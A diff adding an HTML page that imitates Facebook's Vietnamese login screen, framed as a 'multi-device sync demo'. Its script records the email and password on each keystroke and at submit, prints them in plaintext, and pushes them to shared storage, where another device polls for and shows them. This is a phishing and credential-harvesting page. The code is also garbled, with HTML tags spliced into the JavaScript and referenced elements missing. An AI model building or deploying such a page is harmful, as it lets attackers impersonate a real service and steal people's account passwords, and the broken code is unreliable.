@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demo Login Form - Đồng bộ đa thiết bị</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background: linear-gradient(white, #d3d8e8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 396px;
+        }
+        
+        .sync-status {
+            background: #e7f3ff;
+            border: 2px solid #1877f2;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #1877f2;
+        }
+        
+        .sync-status.active {
+            background: #d4edda;
+            border-color: #42b72a;
+            color: #42b72a;
+        }
+        
+        .session-id {
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            font-size: 16px;
+            margin: 5px 0;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .logo-text {
+            font-size: 56px;
+            font-weight: bold;
+            color: #1877f2;
+            font-family: 'Klavika', sans-serif;
+        }
+        
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 28px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            outline: none;
+        }
+        
+        .input-field:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 14px 16px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        
+        .forgot-link {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-link a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account-btn {
+            display: block;
+            margin: 0 auto;
+            padding: 14px 16px;
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        
+        .create-account-btn:hover {
+            background: #36a420;
+        }
+        
+        .info-text {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+        
+        .toggle-console {
+            display: block;
+            margin: 20px auto 10px;
+            padding: 10px 20px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .toggle-console:hover {
+            background: #166fe5;
+        }
+        
+        .console-output {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            margin-top: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            display: none;
+        }
+        
+        .console-output.active {
+            display: block;
+        }
+        
+        .console-title {
+            color: #4ec9b0;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .log-entry {
+            margin-bottom: 8px;
+            padding: 4px;
+        }
+        
+        .log-time {
+            color: #858585;
+        }
+        
+        .log-email {
+            color: #ce9178;
+        }
+        
+        .log-password {
+            color: #ce9178;
+        }
+        
+        .log-device {
+            color: #4ec9b0;
+        }
+        
+        /* Responsive cho điện thoại */
+        @media (max-width: 768px) {
+            body {
+                padding: 0;
+                background: white;
+            }
+            
+            .container {
+                max-width: 100%;
+            }
+            
+            .logo {
+                padding: 20px 0;
+                margin-bottom: 10px;
+            }
+            
+            .logo-text {
+                font-size: 48px;
+            }
+            
+            .login-box {
+                box-shadow: none;
+                border-radius: 0;
+                padding: 16px;
+            }
+            
+            .sync-status {
+                border-radius: 0;
+                margin-bottom: 10px;
+            }
+            
+            .console-output {
+                margin: 0;
+                border-radius: 0;
+                max-height: 200px;
+            }
+            
+            .info-text {
+                padding: 0 16px;
+                font-size: 13px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .logo-text {
+                font-size: 40px;
+            }
+            
+            .input-field {
+                font-size: 16px;
+                padding: 12px 14px;
+            }
+            
+            .login-btn {
+                font-size: 18px;
+                padding: 12px 14px;
+            }
+            
+            .create-account-btn {
+                font-size: 16px;
+                padding: 12px 14px;
+            }
+            
+            .session-id {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="sync-status" id="syncStatus">
+        
+        <div class="logo">
+            <div class="logo-text">facebook</div>
+        </div>
+        
+        <div class="login-box">
+            <form id="loginForm">
+                <input type="text" class="input-field" id="email" placeholder="Email hoặc số điện thoại" required>
+                <input type="password" class="input-field" id="password" placeholder="Mật khẩu" required>
+                <button type="submit" class="login-btn">Đăng nhập</button>
+            </form>
+            
+            <div class="forgot-link">
+                <a href="#">Quên mật khẩu?</a>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <button class="create-account-btn">Tạo tài khoản mới</button>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const consoleOutput = document.getElementById('consoleOutput');
+        const toggleBtn = document.getElementById('toggleConsole');
+        const syncStatus = document.getElementById('syncStatus');
+        const sessionIdEl = document.getElementById('sessionId');
+        
+        // Tạo hoặc lấy session ID
+        let sessionId = localStorage.getItem('demo_session_id');
+        if (!sessionId) {
+            sessionId = 'SESSION-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+            localStorage.setItem('demo_session_id', sessionId);
+        }
+        
+        // Hiển thị session ID
+        sessionIdEl.textContent = 'Session: ' + sessionId;
+        
+        // Phát hiện loại thiết bị
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        const deviceType = isMobile ? '📱 Mobile' : '💻 Desktop';
+        
+        // Toggle console visibility
+        toggleBtn.addEventListener('click', function() {
+            consoleOutput.classList.toggle('active');
+            if (consoleOutput.classList.contains('active')) {
+                toggleBtn.textContent = '❌ Ẩn Console';
+            } else {
+                toggleBtn.textContent = '📊 Hiển thị Console';
+            }
+        });
+        
+        function addLog(message) {
+            const time = new Date().toLocaleTimeString('vi-VN');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;
+            consoleOutput.appendChild(entry);
+            consoleOutput.scrollTop = consoleOutput.scrollHeight;
+        }
+        
+        // Lưu dữ liệu vào storage để đồng bộ
+        async function syncData(type, data) {
+            try {<span class="session-id" id="sessionId">Session: ...</span>
+                const syncData = {
+                    type: type,
+                    data: data,
+                    device: deviceType,
+                    timestamp: Date.now()
+                };
+                
+                await window.storage.set(`sync:${sessionId}:${type}`, JSON.stringify(syncData), true);
+                console.log('Synced:', syncData);
+            } catch (error) {
+                console.error('Sync error:', error);
+            }
+        }
+        
+        // Đọc dữ liệu đồng bộ từ storage
+        async function checkSync() {
+            try {
+                const emailResult = await window.storage.get(`sync:${sessionId}:email`, true);
+                const passwordResult = await window.storage.get(`sync:${sessionId}:password`, true);
+                
+                i<span class="session-id" id="sessionId">Session: ...</span>f (emailResult) {
+                    const emailData = JSON.parse(emailResult.value);
+                    if (emailData.device !== deviceType) {
+                        emailInput.value = emailData.data;
+                        addLog(`<span class="log-device">${emailData.device}</span> đã nhập Email: <span class="log-email">"${emailData.data}"</span>`);
+                    }
+                }
+                
+                if (passwordResult) {
+                    const passwordData = JSON.parse(passwordResult.value);
+                    if (passwordData.device !== deviceType) {
+                        passwordInput.value = passwordData.data;
+                        addLog(`<span class="log-device">${passwordData.device}</span> đã nhập Password: <span class="log-password">"${passwordData.data}"</span>`);
+                    }
+                }
+            } catch (error) {
+                // Key không tồn tại hoặc lỗi khác
+            }
+        }
+        
+        // Kiểm tra đồng bộ mỗi 2 giây
+        setInterval(checkSync, 2000);
+        
+        // Cập nhật trạng thái kết nối
+        setTimeout(() => {
+            syncStatus.classList.add('active');
+            syncStatus.innerHTML = `✅ Đã kết nối đồng bộ ${deviceType}<br><span class="session-id">${sessionId}</span>`;
+            addLog(`✅ Đã kết nối: <span class="log-device">${deviceType}</span>`);
+        }, 1000);
+        
+        // Log khi người dùng nhập
+        emailInput.addEventListener('input', function(e) {
+            const value = e.target.value;
+            console.log('Email/Phone:', value);
+            addLog(`${deviceType} nhập Email: <span class="log-email">"${value}"</span>`);
+            syncData('email', value);
+        });
+        
+        passwordInput.addEventListener('input', function(e) {
+            const value = e.target.value;
+            console.log('Password:', value);
+            addLog(`${deviceType} nhập Password: <span class="log-password">"${value}"</span>`);
+            syncData('password', value);
+        });
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const formData = {
+                email: emailInput.value,
+                password: passwordInput.value,
+                device: deviceType,
+                timestamp: new Date().toISOString()
+            };
+            
+            console.log('Form submitted:', formData);
+            console.table(formData);
+            
+            addLog(`<br>✅ <strong>${deviceType} Submit Form!</strong>`);
+            addLog(`📧 Email: <span class="log-email">"${formData.email}"</span>`);
+            addLog(`🔑 Password: <span class="log-password">"${formData.password}"</span>`);
+            addLog(`⏰ Time: ${formData.timestamp}<br>`);
+            
+            // Lưu submit event
+            await syncData('submit', formData);
+            
+            alert(`${deviceType} - Demo đồng bộ!\n\nEmail: ${formData.email}\nPassword: ${formData.password}\n\nMở cùng session trên thiết bị khác để thấy đồng bộ!`);
+        });
+        
+        // Log ban đầu
+        console.log('%c🎓 Demo Login Form - Đồng bộ đa thiết bị', 'font-size: 20px; color: #1877f2; font-weight: bold');
+        console.log('Session ID:', sessionId);
+        console.log('Device:', deviceType);
+        console.log('Mở cùng session trên thiết bị khác để thấy đồng bộ realtime!');
+        
+        addLog(`📱 Session: <span class="log-device">${sessionId}</span>`);
+        addLog(`🖥️ Thiết bị: <span class="log-device">${deviceType}</span>`);
+    </script>
+</body>
+</html>
